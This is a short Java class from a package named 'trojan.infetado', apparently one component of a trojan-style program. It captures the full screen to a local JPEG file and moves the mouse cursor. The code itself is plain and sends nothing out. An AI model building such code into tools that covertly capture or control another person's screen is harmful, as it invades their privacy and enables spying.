package trojan.infetado;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import javax.imageio.ImageIO;

public class TakePicture {
    
    Robot rob;
    
    public TakePicture() throws AWTException{
        rob = new Robot();
    }
    
    public void takePicture() throws AWTException, IOException{
        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
        
        ImageIO.write(image, "jpg", new File("D:/screenshot.jpg"));
    }
    
    public void mouseUpLeft(){
        rob.mouseMove(100, 100);
    }
    
}